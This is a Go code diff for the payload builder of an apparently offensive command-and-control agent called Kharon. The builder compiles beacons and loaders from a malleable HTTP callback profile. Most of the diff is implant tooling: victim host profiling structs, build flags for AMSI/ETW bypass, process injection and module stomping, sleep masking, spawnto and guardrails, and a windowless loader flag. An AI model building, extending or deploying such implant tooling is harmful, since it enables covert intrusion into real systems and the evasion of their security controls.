@@ -6,7 +6,6 @@ import (
 	"encoding/binary"
 	"encoding/hex"
 	"encoding/json"
-	"log"
 	mrand "math/rand"
 	"os"
 	"os/exec"
@@ -67,6 +66,23 @@ type KharonConfig struct {
 	memEnd   int64
 }
 
+func bytesToHexString(data []byte) string {
+	if len(data) == 0 {
+		return "{ }"
+	}
+	
+	var result string
+	result = "{ "
+	for i, b := range data {
+		result += fmt.Sprintf("0x%02x", b)
+		if i < len(data)-1 {
+			result += ", "
+		}
+	}
+	result += " }"
+	return result
+}
+
 func AgentGenerateProfile(agentConfig string, listenerWM string, listenerMap map[string]any) ([]byte, error) {
 
 	/// START CODE
@@ -97,6 +113,109 @@ func AgentGenerateProfile(agentConfig string, listenerWM string, listenerMap map
 
 	/// END CODE
 	return nil, nil
+}
+
+type KharonData struct {
+	machine struct {
+		username  string
+		computer  string
+		domain    string
+		ipaddress string
+
+		os_arch byte
+
+		processor_numbers uint32
+		processor_name    string
+
+		ram_used  uint32
+		ram_total uint32
+		ram_aval  uint32
+		ram_perct uint32
+
+		os_minor uint32
+		os_major uint32
+		os_build uint32
+
+		allocation_gran uint32
+		page_size       uint32
+
+		cfg_enabled bool
+		dse_status  uint32
+		vbs_hvci    uint32
+	}
+
+	session struct {
+		agent_id 	string
+		
+		sleep_time	string
+		jitter		string
+
+		heap_handle uint64
+
+		elevated bool
+
+		process_arch uint32
+		
+		img_path 	string
+		img_name 	string
+		cmd_line    string
+		process_id	uint32
+		thread_id   uint32
+		parent_id   uint32
+
+		base struct {
+			start uint64
+			end   uint64
+		}
+	}
+
+	killdate struct {
+		enabled bool
+		date    string
+		exit    string
+		selfdel bool
+	}
+
+	worktime struct {
+		enabled bool
+		start   string
+		end     string	
+	}
+
+	guardrails struct {
+		ipaddress string
+		hostname  string
+		username  string
+		domain    string
+	}
+
+	mask struct {
+		heap 	bool
+		beacon	uint32
+
+		ntcontinue uint64
+	}
+
+	injection struct {
+		technique    uint32
+		stomp_module string
+
+		writing 	 uint32
+		allocation   uint32
+	}
+
+	evasion struct {
+		bof_proxy 		bool
+		syscall     	uint32
+		amsi_etw_bypass uint32
+	}
+
+	ps struct {
+		parent_id  uint32
+		block_dlls bool
+		spawnto    string
+		fork_pipe  uint32
+	}
 }
 
 type AgentConfig struct {
@@ -130,6 +249,67 @@ type AgentConfig struct {
 	WorkingTimeStart string `json:"workingtime_start"`
 }
 
+type OutputConfig struct {
+	Mask      bool   
+	Header    string 
+	Format    string 
+	Parameter string 
+	Body      string 
+
+	Append  string
+	Prepend string
+}
+
+type URIConfig struct {
+	ServerOutput *OutputConfig
+	ClientOutput *OutputConfig
+	ClientParams []map[string]interface{}
+}
+
+type ServerError struct {
+	Status   int   
+	Response string
+}
+
+type HTTPMethod struct {
+	ServerHeaders map[string]string    
+	EmptyResponse []byte               
+	ClientHeaders map[string]string    
+	URI           map[string]URIConfig 
+}
+
+type Callback struct {
+	Hosts      	  []string 		
+	Host      	  string 	
+	UserAgent 	  string      	
+	ServerError   *ServerError 
+	Get       	  *HTTPMethod 
+	Post          *HTTPMethod 
+}
+
+type ServerRequest struct {
+	Headers		string
+	Body    	[]byte
+	EmptyResp	[]byte
+	Payload     []byte
+}
+
+type ClientRequest struct {
+	Uri  		string
+	HttpMethod	string
+	Address     string
+	Params      map[string][]string
+	UserAgent   string
+	Body 		[]byte
+	Payload     []byte
+
+	Config      Callback
+
+	UriConfig       *URIConfig
+	HttpMethodCfg	*HTTPMethod
+}
+
+
 func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map[string]any) ([]byte, string, error) {
 	fmt.Println("=== AgentGenerateBuild START ===")
 	fmt.Printf("DEBUG: agentConfig length: %d bytes\n", len(agentConfig))
@@ -141,137 +321,25 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 		fmt.Printf("ERROR: Failed to parse agentConfig: %v\n", err)
 		return nil, "", fmt.Errorf("failed to parse agentConfig: %v", err)
 	}
-	fmt.Printf("DEBUG: Config parsed successfully - Format: %s, Sleep: %s, Jitter: %d\n", cfg.Format, cfg.Sleep, cfg.Jitter)
 
-	// Extract callbacks
-	callbacks := toStringSlice(listenerMap["callback_addresses"])
-	fmt.Printf("DEBUG: Initial callbacks from 'callback_addresses': %v\n", callbacks)
-
-	if len(callbacks) == 0 {
-		if hb, ok := listenerMap["host_bind"]; ok {
-			callbacks = toStringSlice(hb)
-			fmt.Printf("DEBUG: Fallback to 'host_bind': %v\n", callbacks)
-		} else {
-			fmt.Println("WARNING: No 'host_bind' found in listenerMap")
-		}
+	decoded, err := base64.StdEncoding.DecodeString(fmt.Sprint(listenerMap["uploaded_file"]))
+	if err != nil {
+		fmt.Printf("ERROR: failed decode base64: %v\n", err)
+		return nil, "", err
 	}
+	malleable_str := string(decoded)
+	fmt.Printf("DEBUG: Malleable profile decoded (%d bytes)\n", len(malleable_str))
 
-	hosts := []string{}
-	endpoints := []string{}
-	ports := []int{}
-	seenE := map[string]bool{}
-
-	fmt.Printf("DEBUG: Processing %d callback entries\n", len(callbacks))
-	for i, cb := range callbacks {
-		cb = strings.TrimSpace(cb)
-		if cb == "" {
-			fmt.Printf("DEBUG: Skipping empty callback at index %d\n", i)
-			continue
-		}
-		fmt.Printf("DEBUG: Processing callback[%d]: %q\n", i, cb)
-
-		entries := strings.FieldsFunc(cb, func(r rune) bool {
-			return r == '\n' || r == '\r' || r == ',' || r == ';'
-		})
-		fmt.Printf("DEBUG: Split into %d entries: %v\n", len(entries), entries)
-
-		for j, entry := range entries {
-			entry = strings.TrimSpace(entry)
-			if entry == "" {
-				fmt.Printf("DEBUG: Skipping empty entry at index %d\n", j)
-				continue
-			}
-
-			log.Printf("Parsing entry: %q", entry)
-
-			host := entry
-			port := 0
-
-			// IPv6 format: [host]:port
-			if strings.HasPrefix(entry, "[") {
-				log.Printf("Entry appears to be IPv6-style: %q", entry)
-				if idx := strings.Index(entry, "]"); idx != -1 {
-					host = entry[1:idx]
-					rest := strings.TrimSpace(entry[idx+1:])
-					if strings.HasPrefix(rest, ":") {
-						if p, err := strconv.Atoi(strings.TrimSpace(rest[1:])); err == nil {
-							port = p
-						} else {
-							fmt.Printf("WARNING: Failed to parse port from %q: %v\n", rest, err)
-						}
-					}
-					fmt.Printf("DEBUG: Parsed IPv6 - host: %q, port: %d\n", host, port)
-				} else {
-					fmt.Printf("WARNING: Malformed IPv6 address: %q\n", entry)
-				}
-			} else if strings.Contains(entry, ":") {
-				parts := strings.SplitN(entry, ":", 2)
-				host = strings.TrimSpace(parts[0])
-				if p, err := strconv.Atoi(strings.TrimSpace(parts[1])); err == nil {
-					port = p
-				} else {
-					fmt.Printf("WARNING: Failed to parse port from %q: %v\n", parts[1], err)
-				}
-				fmt.Printf("DEBUG: Parsed IPv4/hostname - host: %q, port: %d\n", host, port)
-			} else {
-				fmt.Printf("DEBUG: No port specified for entry: %q\n", entry)
-			}
-
-			if host != "" {
-				hosts = append(hosts, host)
-				fmt.Printf("DEBUG: Added host: %q (total: %d)\n", host, len(hosts))
-			} else {
-				fmt.Println("WARNING: Empty host after parsing")
-			}
-
-			if port > 0 {
-				ports = append(ports, port)
-				fmt.Printf("DEBUG: Added port: %d (total: %d)\n", port, len(ports))
-			}
-		}
+	// Build malleable HTTP bytes
+	malleableBytes, callbackCount, err := BuildMalleableHTTPBytes(malleable_str)
+	if err != nil {
+		fmt.Printf("ERROR: Failed to build malleable HTTP bytes: %v\n", err)
+		return nil, "", err
 	}
+	fmt.Printf("DEBUG: Malleable bytes generated (%d bytes)\n", len(malleableBytes))
+	fmt.Printf("DEBUG: HTTP Callback count: %d\n", callbackCount)
 
-	// Extract endpoints
-	fmt.Printf("DEBUG: Extracting endpoints from 'uri' field\n")
-	uriField := listenerMap["uri"]
-	fmt.Printf("DEBUG: uri field type: %T, value: %v\n", uriField, uriField)
-
-	for i, e := range toStringSlice(uriField) {
-		fmt.Printf("DEBUG: Processing uri[%d]: %q\n", i, e)
-		parts := strings.Split(e, "\n")
-		for j, p := range parts {
-			p = strings.TrimSpace(p)
-			if p == "" {
-				fmt.Printf("DEBUG: Skipping empty endpoint part at index %d\n", j)
-				continue
-			}
-			if !strings.HasPrefix(p, "/") {
-				p = "/" + p
-				fmt.Printf("DEBUG: Added leading slash to endpoint: %q\n", p)
-			}
-			if !seenE[p] {
-				endpoints = append(endpoints, p)
-				seenE[p] = true
-				fmt.Printf("DEBUG: Added endpoint: %q (total: %d)\n", p, len(endpoints))
-			} else {
-				fmt.Printf("DEBUG: Skipping duplicate endpoint: %q\n", p)
-			}
-		}
-	}
-
-	fmt.Printf("\n→ Parsed connection details:\n")
-	fmt.Printf("   Hosts: %v (%d entries)\n", hosts, len(hosts))
-	fmt.Printf("   Ports: %v (%d entries)\n", ports, len(ports))
-	fmt.Printf("   Endpoints: %v (%d entries)\n", endpoints, len(endpoints))
-
-	if len(hosts) == 0 {
-		fmt.Println("ERROR: No hosts parsed from callbacks!")
-		return nil, "", fmt.Errorf("no hosts found in callback configuration")
-	}
-	if len(endpoints) == 0 {
-		fmt.Println("WARNING: No endpoints found, agent may not function properly")
-	}
-
+	// Get working directory
 	wd, err := os.Getwd()
 	if err != nil {
 		fmt.Printf("ERROR: Failed to get working directory: %v\n", err)
@@ -287,11 +355,6 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 		return nil, "", fmt.Errorf("target path not found: %s", targetPath)
 	}
 
-	webHostC := makeCWideList(hosts)
-	webEndpointC := makeCWideList(endpoints)
-	webPortsC := makeCIntList(ports)
-	fmt.Printf("DEBUG: Generated C arrays - hosts: %s, endpoints: %s, ports: %s\n", webHostC, webEndpointC, webPortsC)
-
 	// SSL configuration
 	sslEnabled := false
 	if s, ok := listenerMap["ssl"].(bool); ok {
@@ -304,41 +367,7 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 		fmt.Printf("DEBUG: SSL field not found or unknown type: %T\n", listenerMap["ssl"])
 	}
 
-	// Request headers - Parse and format correctly
-	headersStr := ""
-	if rh := listenerMap["request_headers"]; rh != nil {
-		var headerLines []string
-
-		// Handle different input types
-		switch v := rh.(type) {
-		case string:
-			// Split on newlines to get individual headers
-			lines := strings.Split(v, "\n")
-			for _, line := range lines {
-				line = strings.TrimSpace(line)
-				if line != "" {
-					headerLines = append(headerLines, line)
-				}
-			}
-		case map[string]interface{}:
-			// If it's a map, convert to header format
-			for k, val := range v {
-				headerLines = append(headerLines, fmt.Sprintf("%s: %s", k, val))
-			}
-		}
-
-		if len(headerLines) > 0 {
-			// Join with \r\n for proper HTTP headers
-			headersStr = strings.Join(headerLines, "\\r\\n")
-			// Escape for make/shell
-			headersStr = strings.ReplaceAll(headersStr, `"`, `\"`)
-			fmt.Printf("DEBUG: Request headers (processed): %s\n", headersStr)
-		}
-	} else {
-		fmt.Println("DEBUG: No request_headers found")
-	}
-
-	// Proxy configuration - escape strings
+	// Proxy configuration
 	proxyURL := fmt.Sprint(listenerMap["proxy_url"])
 	if proxyURL == "<nil>" {
 		proxyURL = ""
@@ -367,18 +396,6 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 	}
 	proxyPass = strings.ReplaceAll(proxyPass, `\`, `\\`)
 	proxyPass = strings.ReplaceAll(proxyPass, `"`, `\"`)
-
-	// User-Agent: Clean up and escape properly
-	userAgent := fmt.Sprint(listenerMap["user_agent"])
-
-	// Remove any trailing carriage returns, newlines, or whitespace
-	userAgent = strings.TrimSpace(userAgent)
-	userAgent = strings.Trim(userAgent, "\r\n")
-
-	// Escape for C compiler (Makefile will add L"..." wrapper)
-	userAgent = strings.ReplaceAll(userAgent, `\`, `\\`)
-	userAgent = strings.ReplaceAll(userAgent, `"`, `\"`)
-	fmt.Printf("DEBUG: User-Agent (cleaned): %s\n", userAgent)
 
 	// Parse killdate
 	killdateDay := 0
@@ -454,6 +471,7 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 		}
 	}
 
+	// Parse sleep time
 	khSleep := cfg.Sleep
 	if khSleep == "" {
 		khSleep = "3"
@@ -463,37 +481,13 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 		fmt.Printf("DEBUG: Sleep time: %s\n", khSleep)
 	}
 
-	httpMethod := strings.ToUpper(fmt.Sprint(listenerMap["http_method"]))
-	if httpMethod == "" || httpMethod == "<NIL>" {
-		httpMethod = "POST"
-		fmt.Println("DEBUG: Using default HTTP method: POST")
-	} else {
-		fmt.Printf("DEBUG: HTTP method: %s\n", httpMethod)
-	}
-
-	// Format HTTP method as C wide string literal
-	fmt.Printf("DEBUG: Formatted WEB_METHOD: %s\n", httpMethod)
-
-	// User-Agent: Just escape, Makefile will add L"..." wrapper
-	fmt.Printf("DEBUG: User-Agent (for make): %s\n", userAgent)
-
-	// Headers: Just escape, Makefile will add L"..." wrapper
-	fmt.Printf("DEBUG: Headers (for make): %s\n", headersStr)
-
-	// Format proxy URL - Makefile adds L"..." wrapper
-	fmt.Printf("DEBUG: Proxy URL (for make): %s\n", proxyURL)
-
-	// Format proxy credentials - Makefile adds L"..." wrapper
-	fmt.Printf("DEBUG: Proxy user (for make): %s\n", proxyUser)
-	fmt.Printf("DEBUG: Proxy pass (for make): %s\n", proxyPass)
-
-	// Escape and format ForkPipe - NOTE: This one doesn't use Makefile wrapper
+	// Escape and format ForkPipe
 	forkPipe := cfg.ForkPipe
 	forkPipe = strings.ReplaceAll(forkPipe, `\`, `\\`)
 	forkPipe = strings.ReplaceAll(forkPipe, `"`, `\"`)
 	forkPipeC := fmt.Sprintf("L\\\"%s\\\"", forkPipe)
 
-	// Escape and format Spawnto - used with quotes in Makefile
+	// Escape and format Spawnto
 	spawnto := cfg.Spawnto
 	spawnto = strings.ReplaceAll(spawnto, `\`, `\\`)
 	spawnto = strings.ReplaceAll(spawnto, `"`, `\"`)
@@ -502,15 +496,9 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 
 	stompModule := cfg.stompMod
 
+	// Build make variables
 	makeVars := []string{
-		fmt.Sprintf("WEB_HOST=%s", webHostC),
-		fmt.Sprintf("WEB_PORT=%s", webPortsC),
-		fmt.Sprintf("WEB_ENDPOINT=%s", webEndpointC),
-		fmt.Sprintf("WEB_METHOD='%s'", httpMethod),
 		fmt.Sprintf("WEB_SECURE_ENABLED=%d", boolToInt(sslEnabled)),
-		fmt.Sprintf("WEB_SECURE_ENABLED=%d", boolToInt(sslEnabled)),
-		fmt.Sprintf("WEB_USER_AGENT=%s", userAgent),
-		fmt.Sprintf("WEB_HTTP_HEADERS=%s", headersStr),
 		fmt.Sprintf("WEB_PROXY_ENABLED=%d", boolToInt(proxyEnabled)),
 		fmt.Sprintf("WEB_PROXY_URL=%s", proxyURL),
 		fmt.Sprintf("WEB_PROXY_USERNAME=%s", proxyUser),
@@ -539,9 +527,9 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 
 		fmt.Sprintf("KH_BOF_HOOK_ENABLED=%d", boolToInt(cfg.BofApiProxy)),
 
-		fmt.Sprintf("WEB_HOST_QTT=%d", len(hosts)),
-		fmt.Sprintf("WEB_PORT_QTT=%d", len(ports)),
-		fmt.Sprintf("WEB_ENDPOINT_QTT=%d", len(endpoints)),
+		// Malleable HTTP bytes como array C entre aspas
+		fmt.Sprintf("HTTP_MALLEABLE_BYTES=\"%s\"", bytesToHexString(malleableBytes)),
+		fmt.Sprintf("HTTP_CALLBACK_COUNT=%d", callbackCount),
 	}
 
 	// Guardrails
@@ -586,6 +574,7 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 		makeVars = append(makeVars, "KH_AMSI_ETW_BYPASS=0x000")
 	}
 
+	// Injection method
 	fmt.Printf("DEBUG: Injection method: %s\n", cfg.InjectId)
 	switch cfg.InjectId {
 	case "Standard":
@@ -615,12 +604,12 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 		makeVars = append(makeVars, "KH_SLEEP_MASK=3")
 	}
 
+	// Determine build target
 	debugMode := cfg.Debug
 	target := "x64"
 	if strings.EqualFold(cfg.Format, "x86") {
 		target = "x86"
 	}
-	
 	if debugMode {
 		target = target + "-debug"
 	}
@@ -632,10 +621,9 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 		fmt.Println("   ", v)
 	}
 
+	// Execute make command
 	allArgs := append([]string{"-C", targetPath, target}, makeVars...)
 	cmd := exec.Command("make", allArgs...)
-
-	target = "x64"
 
 	fmt.Printf("\nDEBUG: Running command: make %v\n", allArgs)
 
@@ -652,6 +640,7 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 	}
 	fmt.Println("DEBUG: Make command completed successfully")
 
+	// Read compiled beacon
 	outputFile := filepath.Join(targetPath, "Bin", fmt.Sprintf("Kharon.%s.bin", target))
 	fmt.Printf("DEBUG: Reading output file: %s\n", outputFile)
 
@@ -667,6 +656,7 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 
 	fmt.Printf("\nDEBUG: Processing format: %s\n", cfg.Format)
 
+	// Compile loader if needed
 	if cfg.Format == "Exe" || cfg.Format == "Dll" || cfg.Format == "Svc" {
 		fmt.Println("→ Compiling loader for format:", cfg.Format)
 
@@ -678,6 +668,7 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 			return nil, "", fmt.Errorf("loader path not found: %s", loaderPath)
 		}
 
+		// Generate shellcode header
 		shellcodeHeaderPath := filepath.Join(loaderPath, "Include", "Shellcode.h")
 		fmt.Printf("DEBUG: Generating shellcode header at: %s\n", shellcodeHeaderPath)
 
@@ -730,6 +721,7 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 			"-o", outputPath,
 			sourcePath,
 			"-Os",
+			"-mwindows",
 			"-nostdlib",
 			"-s",
 			"-lkernel32",
@@ -767,6 +759,7 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 		fmt.Println("→ Loader compiled successfully:", outputPath)
 	}
 
+	// Set output filename and final binary
 	if cfg.Format == "Exe" {
 		outFileName = "Kharon.x64.exe"
 	} else if cfg.Format == "Dll" {
